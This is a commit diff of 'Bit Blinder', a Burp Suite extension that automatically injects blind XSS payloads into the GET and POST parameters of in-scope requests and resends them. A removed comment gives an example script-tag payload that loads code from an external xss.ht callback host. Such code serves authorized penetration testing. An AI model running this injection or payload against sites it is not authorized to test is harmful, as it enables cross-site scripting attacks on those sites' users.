cb3c5b28ed4082b9aa0a3ca7760af99bc1eb248a
root <root@bitthebyte-pc.localdomain>
2019-01-29 19:58:43 +0200

    v0.04b

--- blinder.py
+++ blinder.py
@@ -1,135 +1,148 @@
-from burp import IBurpExtender
-from burp import IHttpListener
-from burp import IMessageEditorTabFactory
-from burp import IMessageEditorTab
 from socket import gethostbyname
 from random import randint
+from burp import IBurpExtender
+from burp import IHttpListener
+from burp import ITab
+from lib.utils import URL
+from lib.ui import GUI
 import datetime
 import sys
 
 
-class URL(object):
-	PARAM_URL = 0;
-	PARAM_BODY = 1
-	PARAM_COOKIE = 2
-	PARAM_XML = 3
-	PARAM_XML_ATTR = 4
-	PARAM_MULTIPART_ATTR = 5
-	PARAM_JSON = 6
-
-
-################# USER SETTINGS ####################
-
-OP_RAND_PAYLOAD_INJECTION = 1 # Enable this if you want to randomize your payload selection
-                              # By disabling this the tool will select the first payload only
-
-OP_INJECTION_PARAMS = [ # Those are the types of paramter that the tool will replace        
-	URL.PARAM_URL,        # GET Paramsters
-	URL.PARAM_BODY        # POST Parameters
-]                       # DON'T EDIT THIS UNLESS YOU KNOW WHAT ARE YOU DOING
-
-
-OP_INJECTION_PAYLOADS_LIST = [ # LIST OF BLIND XSS PAYLOADS 
-	'XXXXXXXXXXXXXXXXXX',        # edit this to your paylod ex("><script src="username.xss.ht"><script>)
-	'YYYYYYYYYYYYYYYYYY',        # you can set more than one payload however this will require OP_RAND_PAYLOAD_INJECTION = 1    
-]                              # DON'T EDIT THIS3 UNLESS YOU KNOW WHAT ARE YOU DOING 
-
-################# USER SETTINGS ####################
 
 
 
+OP_INJECTION_PARAMS = [
+	URL.PARAM_URL,
+	URL.PARAM_BODY
+]
 
-################ FOR DEBUGGING #####################
-OP_DEBUG_MODE		= 0
-OP_DEBUG_SERVER		= "127.0.0.1"
-OP_DEBUG_PORT		= 80
-OP_DEBUG_USE_HTTPS	= 0
-OP_SHOW_OUT_OF_SCOPE	= 0
-################ FOR DEBUGGING #####################
-
-
-
-class BurpExtender(IBurpExtender,IHttpListener):
-
-	def registerExtenderCallbacks(self,callbacks):
-		self.callbacks  = callbacks
-		self.callbacks.setExtensionName("BIT/Blinder")
-		self.callbacks.registerHttpListener(self)
-		sys.stdout 		= self.callbacks.getStdout()
-		self.helpers 	= self.callbacks.getHelpers()
-		
-		print("*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*")
-		print("-  Developer: Ahmed Ezzat (BitTheByte)      -")
-		print("-  Github:    https://github.com/BitTheByte -")
-		print("-  Version:   0.03b                         -")
-		print("*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*")
-		print("[WARNING] MAKE SURE TO EDIT THE SETTINGS BEFORE USE")
-		print("[WARNING] THIS TOOL WILL WORK FOR IN-SCOPE ITEMS ONLY")
-		print("[WARNING] THIS TOOL WILL CONSUME TOO MUCH BANDWIDTH")
-
-		return
+OP_DEBUG_MODE = 0
+OP_DEBUG_SERVER = "127.0.0.1"
+OP_DEBUG_PORT = 80
+OP_DEBUG_USE_HTTPS = 0
+OP_SHOW_OUT_OF_SCOPE = 0
 
 
-	def processHttpMessage(self, flags, isRequest, rawData):
+class BurpExtender(IBurpExtender, IHttpListener, ITab):
 
-		if not isRequest: return
+    def getTabCaption(self):
+    	# Setting extenstion tab name
+        return "Bit Blinder"
 
-		request 	= rawData.getRequest()
-		requestInfo 	= self.helpers.analyzeRequest(rawData)
-		url 		= requestInfo.getUrl()
+    def getUiComponent(self):
+    	# Returning instance of the panel as in burp's docs
+        return self.ui.panel
+
+    def registerExtenderCallbacks(self, callbacks):
+
+        gui = GUI() # Local instance of the GUI class
+        self.ui = gui.gui()
+
+        # Registering callbacks from burp api
+        self.callbacks = callbacks
+        self.callbacks.setExtensionName("BIT/Blinder")
+        self.callbacks.registerHttpListener(self)
+
+        # Redirect the stdout to burp stdout
+        sys.stdout = self.callbacks.getStdout()
+        
+        # Saving IExtensionHelpers to use later
+        self.helpers = self.callbacks.getHelpers()
+
+        # Settings up the main gui
+        self.callbacks.customizeUiComponent(self.ui.panel)
+        self.callbacks.addSuiteTab(self)
+
+        print("*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*")
+        print("-  Developer: Ahmed Ezzat (BitTheByte)      -")
+        print("-  Github:    https://github.com/BitTheByte -")
+        print("-  Version:   0.04b                         -")
+        print("*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*")
+        print("[WARNING] MAKE SURE TO EDIT THE SETTINGS BEFORE USE")
+        print("[WARNING] THIS TOOL WILL WORK FOR IN-SCOPE ITEMS ONLY")
+        print("[WARNING] THIS TOOL WILL CONSUME TOO MUCH BANDWIDTH")
+
+        # Invoke burp's api
+        return
+
+    def processHttpMessage(self, flags, isRequest, rawData):
+
+    	# Check if tool is enabled from the gui panel
+        if not self.ui.enable.isSelected(): return
+        # Check if it's not a request from burp
+        if not isRequest: return
+
+        # Getting request data
+        request = rawData.getRequest()
+        requestInfo = self.helpers.analyzeRequest(rawData)
+        url = requestInfo.getUrl()
+
+        # Check if the url in the scope
+        if not self.callbacks.isInScope(url):
+            if OP_SHOW_OUT_OF_SCOPE:
+                print("[-] %s is out of scope" % url)
+            return
 
 
-		if not self.callbacks.isInScope(url):
-			if OP_SHOW_OUT_OF_SCOPE:
-				print("[-] %s is out of scope" % url)
-			return
+        https = 1 if 'https' in requestInfo.url.getProtocol() else 0
+        payloads = self.ui.get_payloads()
+        body = request[requestInfo.getBodyOffset():]
+        path = requestInfo.url.getPath()
+        host = requestInfo.url.getHost()
+        port = requestInfo.url.port
+        method = requestInfo.getMethod()
+        headers = requestInfo.getHeaders()
+        paramters = requestInfo.getParameters()
+        vparams = [p for p in paramters if p.getType() in OP_INJECTION_PARAMS]
 
-		https     = 1 if 'https' in requestInfo.url.getProtocol() else 0
-		body 	  = request[requestInfo.getBodyOffset():]
-		path 	  = requestInfo.url.getPath()
-		host 	  = requestInfo.url.getHost()
-		port      = requestInfo.url.port
-		method    = requestInfo.getMethod()
-		headers   = requestInfo.getHeaders()
-		paramters = requestInfo.getParameters()
-		vparams   = [p for p in paramters if p.getType() in OP_INJECTION_PARAMS]
+        req_time = datetime.datetime.today().strftime('%m/%d|%H:%M:%S')
 
-		req_time  = datetime.datetime.today().strftime('%m/%d|%H:%M:%S') 
+        print("====================================================")
+        print("[{}] HOST: %s".format(req_time) % host)
+        print("[{}] PATH: %s".format(req_time) % path)
+        print("[{}] PORT: %i".format(req_time) % port)
+        print("[{}] METH: %s".format(req_time) % method)
+        print("[{}] HTTP: %i".format(req_time) % (not https))
+        print("[{}] INJC: %s".format(req_time) % len(vparams))
+        print("====================================================")
 
-		print("====================================================")
-		print("[{}] HOST: %s".format(req_time) % host)
-		print("[{}] PATH: %s".format(req_time) % path)
-		print("[{}] PORT: %i".format(req_time) % port)
-		print("[{}] METH: %s".format(req_time) % method)
-		print("[{}] HTTP: %i".format(req_time) % (not https))
-		print("[{}] INJC: %s".format(req_time) % len(vparams) )
-		print("====================================================")
+        new_request = request
+        new_paramters_value = []
 
-		new_request = request
-		new_paramters_value = []
+        for paramter in vparams:
+            name = paramter.getName()
+            value = paramter.getValue()
+            ptype = paramter.getType()
 
-		for paramter in vparams:
-			name  =  paramter.getName()
-			value = paramter.getValue()
-			ptype = paramter.getType()
+            # Check if the randomize option is selected
+            if self.ui.randomize.isSelected():
+                payload = payloads[randint(0, len(payloads) - 1)]
+            else:
+                payload = payloads[0]
 
-			if OP_RAND_PAYLOAD_INJECTION:
-				payload = OP_INJECTION_PAYLOADS_LIST[randint(0, len(OP_INJECTION_PAYLOADS_LIST)-1)]
-			else:
-				payload = OP_INJECTION_PAYLOADS_LIST[0]
+            # Adding the new paramters to array to use it for later
+            new_paramters_value.append(
+                	self.helpers.buildParameter(name, payload, ptype)
+                )
 
-			new_paramters_value.append(
-				self.helpers.buildParameter(name, payload, ptype)
-			)
 
-		for new_paramter in new_paramters_value:
-			name  = new_paramter.getName()
-			value = new_paramter.getValue()
-			ptype = new_paramter.getType()
+        for new_paramter in new_paramters_value:
+            name = new_paramter.getName()
+            value = new_paramter.getValue()
+            ptype = new_paramter.getType()
 
-			updated = self.helpers.updateParameter(new_request, new_paramter)
-			if OP_DEBUG_MODE:
-				self.callbacks.makeHttpRequest(gethostbyname(OP_DEBUG_SERVER), OP_DEBUG_PORT, OP_DEBUG_USE_HTTPS, updated )
-			else:
-				self.callbacks.makeHttpRequest(gethostbyname(host), port, https, updated )
-		return
+            updated = self.helpers.updateParameter(new_request, new_paramter)
+
+            # Check if debug mode is enabled
+            if OP_DEBUG_MODE:
+                self.callbacks.makeHttpRequest(
+                    	gethostbyname(OP_DEBUG_SERVER), OP_DEBUG_PORT,
+                    	OP_DEBUG_USE_HTTPS, updated
+                    )
+            else:
+                self.callbacks.makeHttpRequest(
+                    	gethostbyname(host), port, https, updated
+                    )
+        # Invoke burp api
+        return
